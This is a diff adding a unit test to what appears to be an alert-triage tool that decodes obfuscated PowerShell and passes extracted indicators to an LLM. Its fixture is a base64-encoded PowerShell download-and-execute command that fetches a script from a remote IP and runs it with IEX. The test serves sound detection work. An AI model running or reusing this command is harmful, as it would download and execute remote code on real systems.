@@ -299,6 +299,33 @@ def test_step_extract_indicators_decodes_and_extracts_ioc_from_encoded_command()
     assert "command decode: 1 segment(s) decoded, 0 discarded" in step.output_summary
 
 
+def test_step_extract_indicators_passes_decoded_command_text_to_llm_extraction_prompt():
+    """A defanged IOC hidden inside an encoded blob (e.g. hxxp://185[.]220[.]101[.]1)
+    must reach the LLM-assisted extractor's prompt via the decoded segments, not just
+    the regex path, since the LLM extractor is the only one that can de-obfuscate
+    defanged formatting."""
+    from app.schemas import ProcessExecutionFields
+
+    ps_b64 = "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA4ADUALgAyADIAMAAuADEAMAAxAC4AMQAvAGEALgBwAHMAMQAnACkA"
+    llm_client = _FakeLLMClient(
+        model_available=True,
+        responses={ExtractedIndicators: ExtractedIndicators(candidates=[])},
+    )
+    analyst = _make_analyst(llm_client=llm_client)
+    alert = _make_alert(
+        full_log="",
+        process=ProcessExecutionFields(command_line=f"powershell.exe -EncodedCommand {ps_b64}"),
+    )
+
+    analyst._step_extract_indicators(alert, model_available=True)
+
+    extract_calls = [prompt for prompt, schema in llm_client.calls if schema is ExtractedIndicators]
+    assert len(extract_calls) == 1
+    # "185.220.101.1" alone also appears in the prompt template's boilerplate example text,
+    # so assert on the decoded payload's distinctive substring instead.
+    assert "a.ps1" in extract_calls[0]
+
+
 def test_step_extract_indicators_returns_none_command_decode_result_when_no_process_fields():
     analyst = _make_analyst()
     alert = _make_alert(full_log="Invalid user admin from 203.0.113.5")
